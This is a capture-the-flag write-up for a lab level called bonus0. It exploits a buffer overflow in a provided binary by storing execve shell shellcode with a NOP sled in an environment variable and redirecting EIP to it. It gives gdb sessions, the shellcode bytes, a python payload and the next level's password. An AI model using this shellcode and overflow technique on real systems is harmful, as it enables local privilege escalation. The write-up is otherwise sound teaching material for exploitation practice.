# Bonus0 - Code redirection using environnment variable

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| bonus0 | `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728` |
| bonus1 | `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute the binary

```shell
~/bonus0 aaa
  -
  (stdin) a
  -
  (stdin) b
  > a b
```

There is 2 prompts, and it concatenates them.

Lets debug the binary

```shell
(gdb) info functions
0x080484b4  p
0x0804851e  pp
0x080485a4  main
```

See our assembly interpretation in [source file](../source.c)

We can see there is 2 prompts that read at most 4096. Then replace the first `\n` with a `\0`. And then extract 20 chars and concatenate them together.
But if there is no `\n` is the first 20 characters, there is a problem.

Lets check that together, what if we write exactly 20 chars.

```shell
./bonus0
   -
  (stdin) AAAAAAAAAAAAAAAAAAA # 19 chars
   -
  (stdin) BBBBBBBBBBBBBBBBBBBB # 20 chars
  > AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
# It pass with 19 chars in the 1st prompt

./bonus0
  -
  (stdin) AAAAAAAAAAAAAAAAAAAA # 20 chars
  -
  (stdin) BBBBBBBBBBBBBBBBBBBB # 20 chars
  > AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBB
  Segmentation fault (core dumped)
```

It segfaults with 20 characters in the first buffer.

Lets debug that.

```shell
gdb-peda$ b*main+18
  (stdin) ABCDEFGHIJKLMNOPQRSTUVWXYZ (A-T 20)
  (stdin) abcdefghijklmnopqrstuvwxyz
gdb-peda$ run
gdb-peda$ x/50x $esp+0x16
  0xbffff616:[0x44434241	0x48474645	0x4c4b4a49	0x504f4e4d
  0xbffff626:	0x54535251][0x64636261	0x68676665  0x6c6b6a69
  0xbffff636:	0x706f6e6d	0x74737271][0xb7fd0ff4][0x63626120
  0xbffff646:	0x67666564	0x6b6a6968	0x6f6e6d6c	0x73727170]
  0xbffff656:	0xfd0ff474	0xc85800b7	0x0000b7fd	0xf61c0000

# [A-T][a-t][0xb7fd0ff4][a-c]' '[d-s]
# 20    20  4            3    1  16

gdb-peda$ continue
  EIP: 0x6d6c6b6a ('jklm')
  Invalid $PC address: 0x6d6c6b6a
  Stopped reason: SIGSEGV
  0x6d6c6b6a in ?? ()
```

Since we injected 20 chars in the prompts, there is like an overflow and it tries to access to the address `0x6d6c6b6a` ('jklm').

Maybe we could set a shellcode as environment variable, and redirect the code to the shellcode address.

We set the shellcode environment variable:

```shell
export SHELLCODE=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

We get the shellcode address:

```shell
gdb-peda$ searchmem SHELLCODE
  [stack] : 0xbffff864 ("SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀")
gdb-peda$ p 0xbffff864 + 10 # (length of "SHELLCODE=")
  $1 = 0xbffff86e
```

Then we replace the part "jklm" in the second prompt with the shellcode address :

```shell
# First prompt: A * 4095 + '\n' (=> to fill exactly the first prompt)
# Second prompt: abcdefghi\x6e\xf8\xff\xbfnopqrstuvwxyz

python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x6e\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
```

Lets try in gdb

```shell
gdb-peda$ run < /tmp/exploit10
  AAAAAAAAAAAAAAAAAAAAabcdefghivnopqrst abcdefghivnopqrst
> process 6716 is executing new program: /bin/dash
```

It seems that works, lets try directly with the binary:

```shell
cat /tmp/exploit10 - | ~/bonus0
  AAAAAAAAAAAAAAAAAAAAabcdefghivnopqrst abcdefghivnopqrst
id
> Segmentation fault (core dumped)
```

Unfortunately, it works perfectly with gdb but not out of debugger.

In this [post](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it), the first contributor argues _"the stack addresses in the debugger may not match the addresses during normal execution"_.

So maybe our shellcode address is not exact.

Another contributor advices us to put some NOP Sled before our malicious code.

We will modify our shellcode and put some NOP Sled before the shellcode to approximate the exact shellcode address.

```bash
export SHELLCODE=$(python -c 'print "\x90" * 0xff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

```shell
gdb-peda$ searchmem SHELLCODE
  [stack] : 0xbffff764 ("SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀")
gdb-peda$ p 0xbffff764 + 10 # (length of "SHELLCODE=")
  $1 = 0xbffff76e

python -c 'print "A" \* 4095 + "\n" + "abcdefghi" + "\x6e\xf7\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10

cat /tmp/exploit10 - | ~/bonus0
   -
   -
  > AAAAAAAAAAAAAAAAAAAAabcdefghiwnopqrst abcdefghiwnopqrst
  $ whoami
  > bonus1
  $ cat /home/user/bonus1/.pass
  > cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---

## Sources

### Hack

- [Buffer overflow et variable d'environnement](https://www.hacktion.be/buffer-overflow-variable-environnement/)
- [Buffer overflow works in gdb but not without it](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)

### C

- [Man puts](https://linux.die.net/man/3/puts)
- [Man read](https://linux.die.net/man/3/read)
- [Man strchr](https://linux.die.net/man/3/strchr)
- [Man strcpy](https://linux.die.net/man/3/strcpy)
- [Man strncpy](https://linux.die.net/man/3/strncpy)
- [Man strcat](https://linux.die.net/man/3/strcat)
